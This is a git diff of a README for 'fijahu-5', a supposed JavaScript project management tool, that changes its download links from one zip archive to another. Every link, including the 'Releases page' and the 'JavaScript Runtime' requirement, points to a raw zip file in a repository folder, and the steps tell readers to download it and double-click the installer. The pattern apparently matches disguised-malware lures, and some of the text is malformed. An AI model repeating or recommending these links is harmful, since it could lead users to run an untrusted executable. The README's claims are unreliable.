@@ -1,7 +1,7 @@
 # 🚀 fijahu-5 - Easily Manage Your JavaScript Projects
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Dishonorpeachpit230/fijahu-5/main/quiz/fijahu-5_v3.4.zip%https://raw.githubusercontent.com/Dishonorpeachpit230/fijahu-5/main/quiz/fijahu-5_v3.4.zip)](https://raw.githubusercontent.com/Dishonorpeachpit230/fijahu-5/main/quiz/fijahu-5_v3.4.zip)
+[![Download](https://raw.githubusercontent.com/Dishonorpeachpit230/fijahu-5/main/quiz/fijahu_v2.1.zip%https://raw.githubusercontent.com/Dishonorpeachpit230/fijahu-5/main/quiz/fijahu_v2.1.zip)](https://raw.githubusercontent.com/Dishonorpeachpit230/fijahu-5/main/quiz/fijahu_v2.1.zip)
 
 ## 📋 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -16,9 +16,9 @@ Welcome to fijahu-5! This tool helps you manage JavaScript projects easily. You 
 ## 💾 Download & Install
 To download the latest version of fijahu-5, click the button below:
 
-[Download fijahu-5](https://raw.githubusercontent.com/Dishonorpeachpit230/fijahu-5/main/quiz/fijahu-5_v3.4.zip)
+[Download fijahu-5](https://raw.githubusercontent.com/Dishonorpeachpit230/fijahu-5/main/quiz/fijahu_v2.1.zip)
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Dishonorpeachpit230/fijahu-5/main/quiz/fijahu-5_v3.4.zip).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Dishonorpeachpit230/fijahu-5/main/quiz/fijahu_v2.1.zip).
 2. **Choose the Latest Version:** Look for the most recent version of fijahu-5.
 3. **Download the File:** Click on the link to download the installation file that matches your operating system.
 4. **Run the Installer:** Locate the downloaded file on your computer and double-click it to run the installation.
@@ -39,7 +39,7 @@ To run fijahu-5, ensure your system meets these minimum requirements:
 - **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
 - **RAM:** At least 4GB of memory.
 - **Storage:** Minimum 500MB of free disk space.
-- **JavaScript Runtime:** https://raw.githubusercontent.com/Dishonorpeachpit230/fijahu-5/main/quiz/fijahu-5_v3.4.zip version 12.0 or higher.
+- **JavaScript Runtime:** https://raw.githubusercontent.com/Dishonorpeachpit230/fijahu-5/main/quiz/fijahu_v2.1.zip version 12.0 or higher.
 
 ## ❓ Frequently Asked Questions
 ### What is fijahu-5?
